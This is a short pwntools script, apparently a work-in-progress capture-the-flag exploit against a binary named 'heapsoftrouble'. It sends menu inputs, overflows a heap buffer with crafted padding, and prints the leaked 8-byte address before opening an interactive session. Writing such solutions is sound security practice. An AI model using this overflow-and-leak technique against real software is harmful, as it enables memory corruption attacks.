#!/usr/bin/python3
from pwn import *

#p = remote( 'chal.ctf.b01lers.com', '1010')
p = process ('./heapsoftrouble',env={"LD_PRELOAD" : "/home/pooty/shared/biolers/libc.so.6"})
input('attach')

p.sendline('definitely_not_neo')
p.sendline('2')
p.sendline('Matrix #0')

#p.sendline('2')
#p.sendline('Matrix #15')

p.sendline('7')
p.sendline('a'*0x1f)

p.sendline('7')
p.sendline('a'*0x40 + '\xff')

p.sendline('5')

p.recvuntil('[Matrix #1')
p.recv(63)
print(hex(u64(p.recv(8))))
#print(hexdump(p.recv(200)))

p.interactive()
